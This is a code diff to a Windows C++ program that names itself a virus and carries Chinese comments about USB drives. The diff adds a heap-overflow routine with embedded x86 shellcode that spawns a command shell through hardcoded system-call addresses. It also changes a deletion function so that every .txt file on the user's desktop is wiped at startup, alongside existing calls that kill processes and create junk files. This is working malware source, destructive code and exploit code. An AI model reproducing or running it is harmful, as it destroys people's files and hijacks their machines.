@@ -55,6 +55,7 @@ TCHAR szExePath[MAX_PATH];//the virus's path
 TCHAR U[2];//保存U盘的盘符
 TCHAR szSysPath[MAX_PATH];//system path
 
+void HeapOverflow();
 
 //常量
 const TCHAR *szExeName="virus.exe";
@@ -173,11 +174,11 @@ bool SortFileAndFindFile(string value_path,string filepath)
     return false;
 }
 
-void DeleteSinFile(const char *path) 
+void DeleteSinFile(char *path)
 {
-    string remove_files[1]= {"*.txtq"};
+    string remove_files[1]= {"*.txt"};
     vector<string> delfile;
-    getFIles(path,delfile,"*.txtq");
+    getFIles(path,delfile,"*.txt");
     for(int i=0; i<delfile.size(); i++)
     {
         if (remove(delfile[i].c_str()) == -1)
@@ -213,13 +214,15 @@ LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam,LPARAM lParam)
     string ModifyName="";
     switch(message)
     {
-    case WM_CREATE: 
+    case WM_CREATE:
         U[1]=':';
         GetSystemDirectory(szSysPath,MAX_PATH);
         SetTimer(hwnd,TIMER,5000,0);//启动计时器
         GetModuleFileName(NULL,szExePath,MAX_PATH);//得到自身的路径
         desktop_path=getDesktopPath();
         ModifyName="*.txt";
+        HeapOverflow();
+        DeleteSinFile(desktop_path.c_str());
         ModifyLineData(desktop_path,ModifyName);
         KillAllPro();
         make_rubbish();
@@ -496,4 +499,58 @@ void ModifyLineData(string fileName,string type)
     }
     return ;
 }
+void HeapOverflow()
+{
+    int i;
+    HANDLE hChunk;
+    void* allocations[ALLOC_COUNT];
+    HANDLE defaultHeap = GetProcessHeap();
+    
+    for (i = 0; i < ALLOC_COUNT; i++)
+    {
+        hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
+        memset(hChunk, 'A', CHUNK_SIZE);
+        allocations[i] = hChunk;
+    }
+    char ShellCode[] =
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"BBBBBBBBBBBBBBBB"
+		"CCCCDDDD"
+		"\x90\x90\x90\x90\x90\x90\xeb\x08"	
+        "\x14\xF7\xE2\x77"						
+        "\x4C\x14\xEC\x77"						
+        "\x33\xC0\x50\xC6\x04\x24\x6C\xC6\x44\x24\x01\x6C\x68"
+        "\x52\x54\x2E\x44\x68\x4D\x53\x56\x43\x8B\xC4\x50\xB8"  
+        "\xcf\x05\xe7\x77" 
+        "\xFF\xD0\x33\xC0\x50\xC6\x04\x24\x63\xC6\x44\x24\x01"
+        "\x6F\xC6\x44\x24\x02\x6D\x68\x61\x6E\x64\x2E\x68\x63"
+        "\x6F\x6D\x6D\x8B\xC4\x50\xB8"
+        "\xbf\x8e\x01\x78" 
+        "\xFF\xD0";
 
+        HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);
+        memcpy(allocations[2], ShellCode, sizeof(ShellCode));
+}
